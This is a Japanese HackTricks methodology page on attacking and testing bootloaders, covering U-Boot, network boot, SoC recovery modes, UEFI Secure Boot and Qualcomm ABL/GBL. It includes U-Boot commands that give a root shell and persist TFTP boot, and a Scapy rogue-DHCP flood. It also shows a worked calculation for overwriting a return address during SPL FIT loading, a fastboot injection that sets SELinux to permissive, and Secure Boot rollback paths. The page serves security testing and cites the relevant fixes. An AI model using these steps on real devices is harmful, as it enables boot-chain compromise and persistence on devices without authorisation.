# ブートローダーのテスト

{{#include ../../banners/hacktricks-training.md}}

デバイスの起動設定を変更し、U-Boot や UEFI クラスのローダーなどのブートローダーをテストする際には、以下の手順が推奨されます。早期のコード実行を実現し、署名やロールバックに対する保護を評価し、リカバリーやネットワークブートの経路を悪用することに重点を置きます。

関連項目: bl2_ext のパッチ適用による MediaTek secure-boot のバイパス:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot の手早い攻略と環境の悪用

1. インタープリターシェルにアクセスする
   - 起動中に `bootcmd` が実行される前に、既知の中断キー（多くの場合、任意のキー、0、スペース、またはボード固有の「magic」シーケンス）を押して、U-Boot プロンプトを表示します。<sup>[[1]](#references)</sup>

2. 起動状態と変数を調べる
   - 便利なコマンド:
     - `printenv` (環境変数を表示)
     - `bdinfo` (ボード情報、メモリアドレス)
     - `help bootm; help booti; help bootz` (サポートされるカーネル起動方法)
     - `help ext4load; help fatload; help tftpboot` (利用可能なローダー)

3. root シェルを取得するために起動引数を変更する
   - `init=/bin/sh` を追加し、通常の init の代わりにカーネルがシェルを起動するようにします:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. TFTP serverからNetbootする
   - ネットワークを設定し、LANからkernel/FIT imageを取得する:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. 環境を介して変更を永続化する
   - envストレージが書き込み保護されていなければ、制御を永続化できます:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - `bootcount`、`bootlimit`、`altbootcmd`、`boot_targets` のような、fallback path に影響する変数を確認します。設定値に問題があると、shell に繰り返し侵入できる場合があります。

6. debug/unsafe 機能を確認する
   - 次の項目を探します: `bootdelay` > 0、`autoboot` が無効、制限のない `usb start; fatload usb 0:1 ...`、serial 経由で `loady`/`loads` を実行できること、信頼できない media からの `env import`、signature checks を行わずに読み込まれる kernel/ramdisk。

7. U-Boot image/verification のテスト
   - プラットフォームが FIT images による secure/verified boot を謳っている場合、unsigned と tampered の両方の image を試します:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` がない場合や、従来の `verify=n` の動作では、多くの場合、任意の payload の起動が許可されます。
   - 単純な許可／拒否の結果だけで終わらせないでください。最近の FIT 研究では、検証パス自体が pre-auth 攻撃対象領域になり得ることが示されました。外部保存された FIT データ（`data-offset`、`data-position`、`data-size`）、署名付き構成の選択、`loadables`、overlay / `extra-conf` の処理をネガティブテストしてください。
   - 対応するソースツリーがある場合は、実機に触れる前に `test/vboot/vboot_test.sh` を使うと、U-Boot sandbox で FIT 検証の動作をすばやく再現できます。<sup>[[10]](#references)</sup>

8. Standard Boot（`bootstd`）、`extlinux`、スクリプト bootflow
   - 最近の U-Boot ビルドでは、`bootcmd` は単に Standard Boot を呼び出すラッパーであることがよくあります。つまり、表示上の環境が無害に見えても、書き込み可能なメディア、PXE、SPI flash が実際の信頼境界になる可能性があります。
   - `extlinux` bootmeth は `/` と `/boot` の下にある `extlinux/extlinux.conf` を検索します。スクリプト bootmeth はまず `boot.scr.uimg` を検索し、次に `boot.scr` を検索します。ネットワークブートでは、スクリプトのファイル名を `boot_script_dhcp` から取得できます。
   - トリアージに役立つコマンド：
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - テストする abuse case: `boot_targets` 内で優先順位が高い攻撃者制御の USB/SD メディア、書き込み可能な `/boot/extlinux/extlinux.conf`、`boot.scr` を提供する不正な TFTP、または `script_offset_f` を介した SPI ベースのスクリプト実行。
   - プラットフォームが FIT verification に依存する場合、設定がイメージ単位だけでなく configuration level で署名されていることを確認してください。`required-mode=all` は、いずれか1つの必須キーを受け入れる方式より強固です。

### SPL external FIT data copied before verification

SPL FIT loading では、configuration signature が完全でも、external payload metadata が安全になるわけではありません。U-Boot は `data-position`、`data-offset`、`data-size` を署名済み configuration properties から除外します。影響を受ける `load_simple_fit()` の経路では、SPL はこれらのフィールドからソースオフセットとコピー長を算出し、イメージハッシュをチェックする**前に** `info->read()` を呼び出します。そのため、書き込み可能な boot media 上に細工した FIT を置けば、署名を偽造せずに RAM を上書きできます。署名済みの `load` property は通常、コピー先を固定するため、まずコピーサイズ超過によって、そのアドレスからスタックやその他の制御データに到達できるかを確認してください。<sup>[[15]](#references)[[16]](#references)</sup>

flash read を前提とせず、実際の loader と memory map を追跡してください。実証された RAM loader は `spl_ram_load_read()` と `memcpy()` に到達しました。呼び出し箇所で、`fit_offset` と reader が加算する FIT base address、loader のブロック長 (`spl_get_bl_len(info)`)、fork 固有のアラインメント、結果として得られる `read_offset` と転送 `size`、コピー先の `src_ptr`、保存された return address の位置を記録してください。連続してマップされたソース領域が必要なコピー距離をカバーするか、コピー先と重なるか、ソース位置のバイト列で攻撃者制御の FIT data 内を指すポインターを構成できるかを確認します。ポインター全体が loader のアラインメント制約を満たせない場合は、一般的な [partial return-address overwrite technique](../../binary-exploitation/stack-overflow/ret2win/) が適用できます。<sup>[[16]](#references)</sup>

研究者による 32-bit AST2600 のテストビルドでは、`src_ptr` は `0x80001000`、`memcpy` の保存された return address は `0x902ffe24` でした。OpenBMC の stack placement および alignment helpers を適用した upstream build が使用されており、RAM reader は `0x10000` の FIT base を加算し、それらの helpers はソースオフセットを `ARCH_DMA_MINALIGN` (64 bytes) に切り下げていました。`0x902fffe4` にある有効な little-endian ポインターと、1 byte 手前で終わるコピーにより、既知のゼロである上位 byte を維持しながら、保存された return address の下位3 bytes だけを変更できました。一方、upstream RAM loader はブロック長に1 byteを使用するため、この64-byteアラインメントと部分上書きの回避策は、SPL 全般に必要なものではありません。ビルドごとにアドレス、loader のブロック長、コピー範囲を再計算してください。以下の元の計算における `fit_offset` は、RAM reader による FIT base の実効的な加算値を指しており、`load_simple_fit()` に渡される引数とは限りません。<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

upstream の修正では、`info->read()` の実行前に、raw の `data-size` と**ブロック境界に合わせた**転送サイズの両方に上限を設けています。overlay path では実際のバッファ容量を渡しますが、その他の呼び出し元では `CONFIG_SYS_BOOTM_LEN` を使います。これは緩やかな上限にすぎず、転送先にその容量分の空きメモリがあることの証明にはなりません。vendor fork を評価する際は、これらのチェックが実装されていることを確認し、許可されたコピー範囲をボードの実際の SPL stack および予約領域と比較してください。<sup>[[15]](#references)[[16]](#references)</sup>

## ネットワークブートの攻撃対象領域（DHCP/PXE）と不正サーバー

9. PXE/DHCP パラメータの fuzzing
   - U-Boot のレガシーな BOOTP/DHCP 処理には、メモリ安全性の問題が発生したことがあります。たとえば、CVE‑2024‑42040 は、細工された DHCP 応答によるメモリ開示について説明しており、U-Boot のメモリ内のバイト列がネットワーク経由で leak する可能性があります。<sup>[[4]](#references)</sup> DHCP/PXE のコードパスに対し、過剰に長い値やエッジケースの値（option 67 の bootfile-name、vendor options、file/servername fields）を使ってテストし、ハングや leak がないか確認してください。
   - ネットワークブート中にブートパラメータをストレステストするための最小限の Scapy スニペット:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - また、PXE filename フィールドが、OS 側のプロビジョニングスクリプトに引き渡される際、サニタイズされずにシェルやローダーの処理に渡されるかどうかも検証します。

10. 不正な DHCP サーバーによるコマンドインジェクションテスト
   - 不正な DHCP/PXE サービスをセットアップし、filename または options フィールドに文字を注入して、ブートチェーンの後続段階でコマンドインタープリターに到達できるか試します。Metasploit の DHCP auxiliary、`dnsmasq`、またはカスタム Scapy スクリプトが有効です。まずラボネットワークを隔離してください。

## 通常のブートを上書きする SoC ROM リカバリモード

多くの SoC には BootROM の「loader」モードがあり、フラッシュイメージが無効でも USB/UART 経由でコードを受け付けます。secure-boot の fuse が焼き込まれていない場合、これはブートチェーンの非常に早い段階で任意のコードを実行する手段になります。

- NXP i.MX (Serial Download Mode)
  - ツール: `uuu` (mfgtools3) または `imx-usb-loader`。
  - 例: `imx-usb-loader u-boot.imx` を実行して、カスタム U-Boot を RAM に転送し実行します。
- Allwinner (FEL)
  - ツール: `sunxi-fel`。
  - 例: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` または `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`。
- Rockchip (MaskROM)
  - ツール: `rkdeveloptool`。
  - 例: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` を実行して、ローダーをステージングし、カスタム U-Boot をアップロードします。

デバイスの secure-boot eFuse/OTP が焼き込まれているか評価してください。焼き込まれていない場合、BootROM のダウンロードモードは、多くの場合、最初のステージのペイロードを SRAM/DRAM から直接実行することで、上位レイヤーの検証 (U-Boot、kernel、rootfs) をバイパスします。

## UEFI/PC クラスのブートローダー: 簡易チェック

11. ESP の改ざん、ロールバック、鍵登録のテスト
   - EFI System Partition (ESP) をマウントし、ローダーのコンポーネントを確認します: `EFI/Microsoft/Boot/bootmgfw.efi`、`EFI/BOOT/BOOTX64.efi`、`EFI/ubuntu/shimx64.efi`、`grubx64.efi`、ベンダーのロゴパス。
   - 可能であれば、OS から Secure Boot の状態と鍵データベースをダンプします:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - プラットフォームが Setup Mode の場合、認証なしで鍵の登録を受け付ける場合、またはテスト用／デフォルトの Platform Key（PKfail クラス）が設定されて出荷される場合、ローカル管理者または物理的な攻撃者は独自の KEK/db を登録し、Secure Boot が「有効」に見える状態を保ったまま、任意の EFI バイナリを起動できます。<sup>[[3]](#references)</sup>
   - Secure Boot の失効情報（dbx）が最新でない場合、ダウングレードした、または既知の脆弱性がある署名済みの boot コンポーネントで起動できるか試してください。プラットフォームが古い shim/bootmanager を引き続き信頼している場合、ESP から独自の kernel や `grub.cfg` を読み込んで永続化できることがよくあります。
   - Windows では、ファームウェアの `dbx` に `Microsoft Windows Production PCA 2011` の署名者が存在しない場合、パッチ適用済みのホストでも脆弱な署名済み boot manager を受け入れることがあります。これは BlackX で確認されています。<sup>[[13]](#references)[[14]](#references)</sup> Baton Drop 型のバイパスでは、攻撃者の MOK を登録できます。その後、正規の shim が、次回以降の起動時にその鍵で署名された EFI ペイロードを読み込めます。<sup>[[12]](#references)[[13]](#references)</sup> 後から古い Windows 署名者を失効させても、登録済みの MOK は削除されないため、その shim が引き続き信頼されていれば、shim ベースの経路で永続化できます。<sup>[[12]](#references)</sup>
   - 許可を得た UEFI マシンでこのロールバック経路をテストする前に、Windows の更新履歴だけでなく、**ファームウェアで実際に適用されている失効状態**を確認してください。<sup>[[13]](#references)[[14]](#references)</sup> Microsoft は、`dbx` 内の 2011 署名者を確認する読み取り専用の管理者権限 PowerShell コマンドを提供しています。<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` はあくまで手がかりです。復旧可能なラボ環境で、該当する署名済みブートコンポーネントとその他の失効状態を確認してください。<sup>[[12]](#references)[[14]](#references)</sup> 保留中のレジストリ更新や期限切れの署名証明書は、`dbx` の失効が完了したことと同じではありません。<sup>[[13]](#references)[[14]](#references)</sup>

12. 古い shim / SBAT / dbx の失効テスト
   - 失効情報が古い場合、古い Microsoft 署名済み shim やベンダーのフォークが、BYOVD-style の bootkit 経路として依然利用できることがあります。隔離されたラボで、過去に脆弱性があった shim を ESP に配置し、独自の `grubx64.efi` または kernel の chainload を試みます。<sup>[[11]](#references)</sup>
   - 簡易トリアージ:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - shimが失効リストに載っているにもかかわらず実行される場合、firmware/OSの`dbx`更新が古いか、upstreamのSBAT保護を継承していないfork版loaderを信頼しています。

13. Boot logo parsing bugs (LogoFAIL class)
   - 複数のOEM/IBV firmwareに、boot logoを処理するDXE内の画像解析の脆弱性がありました。攻撃者がvendor固有のパス（例: `\EFI\<vendor>\logo\*.bmp`）に細工した画像をESP上に置いて再起動できる場合、Secure Bootが有効でも初期boot中にコード実行できる可能性があります。platformがユーザー提供のlogoを受け入れるか、またOSからそれらのパスに書き込み可能かをテストしてください。<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

QualcommのABLが**Generic Bootloader Library (GBL)**を読み込むAndroid 16端末では、ABLが`efisp` partitionから読み込むUEFI appを**認証するか**確認してください。ABLがUEFI appの**存在**だけをチェックし、署名を検証しない場合、`efisp`への書き込みprimitiveにより、boot時に**pre-OS unsigned code execution**が可能になります。<sup>[[6]](#references)[[7]](#references)</sup>

実用的な確認方法と悪用経路:

- **efisp write primitive**: `efisp`にカスタムUEFI appを書き込む手段が必要です（root/privileged service、OEM appのbug、recovery/fastboot経路）。これがなければ、GBLの読み込みの欠陥には直接到達できません。<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL bug): 一部のbuildでは、`fastboot oem set-gpu-preemption`の追加tokenを受け入れてkernel cmdlineに追加します。これを利用してSELinuxをpermissiveにし、保護されたpartitionへの書き込みを可能にできます:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  デバイスにパッチが適用されている場合、このコマンドは追加の引数を拒否するはずです。<sup>[[5]](#references)[[6]](#references)</sup>
- **永続フラグを介したBootloaderのunlock**: boot-stage payloadによって永続的なunlockフラグ（例: `is_unlocked=1`、`is_unlocked_critical=1`）を書き換えれば、OEM serverや承認ゲートを通さずに`fastboot oem unlock`を再現できます。これは次回の再起動後も維持される状態変更です。<sup>[[6]](#references)</sup>

防御・トリアージに関する注意事項:

- ABLが`efisp`からのGBL/UEFI payloadに対してsignature verificationを行うか確認してください。行わない場合、`efisp`は高リスクなpersistence surfaceとして扱ってください。
- ABL fastboot OEM handlersにパッチが適用され、**引数の数を検証**して追加トークンを拒否するようになっているか確認してください。<sup>[[8]](#references)[[9]](#references)</sup>

## ハードウェアに関する注意

early boot中にSPI/NAND flashを操作する場合（例: ピンを接地して読み取りを回避するなど）は注意し、必ずflashのdatasheetを確認してください。タイミングを誤った短絡は、デバイスやprogrammerを破損させる可能性があります。

## メモと追加のヒント

- `env export -t ${loadaddr}`と`env import -t ${loadaddr}`を試し、environment blobをRAMとstorageの間で移動します。一部のplatformでは、認証なしでリムーバブルメディアからenvをインポートできます。
- `extlinux.conf`経由で起動するLinuxベースのシステムでpersistenceを得るには、署名チェックが適用されていない場合、boot partition上の`APPEND`行を変更し（`init=/bin/sh`や`rd.break`を挿入するなど）、それだけで十分なことがよくあります。
- 対象がdual-slot / A/B updatesを使用している場合は、[firmware analysis overview](README.md)にあるanti-rollbackとslot-desyncの手法を確認し、bootloader自体の外にあるupdaterだけのtrust gapを見落とさないようにしてください。
- userlandが`fw_printenv/fw_setenv`を提供する場合は、`/etc/fw_env.config`が実際のenv storageと一致するか確認してください。offsetの設定ミスにより、誤ったMTD regionを読み書きする可能性があります。

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAILの発見: システム起動中の画像解析がもたらす危険性](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: 信頼されていないPlatform KeyがUEFI ecosystemのSecure Bootを脅かす](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040の詳細](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: サニタイズされていない2つの文字列を使ったXiaomiのunlock](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 EliteのGBL exploitにより攻撃者がbootloaderをunlock可能に](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL)のアーキテクチャ](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: 信頼されていない入力がkernel cmdlineに伝播する問題を修正](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: set-hw-fence-valueコマンドのチェックを追加](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [起動に不適: U-BootのFIT signature verificationを破る](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft署名済みUEFI shim bootloaderがSecure Boot bypassに対して脆弱](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus UEFI bootkit: 神話が事実と判明](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: BlackLotusに類似したUEFI bootkit](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Secure Bootの変更に伴うWindows Boot Managerの失効を管理する方法](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [U-Boot patch: 外部データのサイズを制限してから読み込む](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [隠れた利点: U-Boot SPLのSignature Verificationを回避する](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
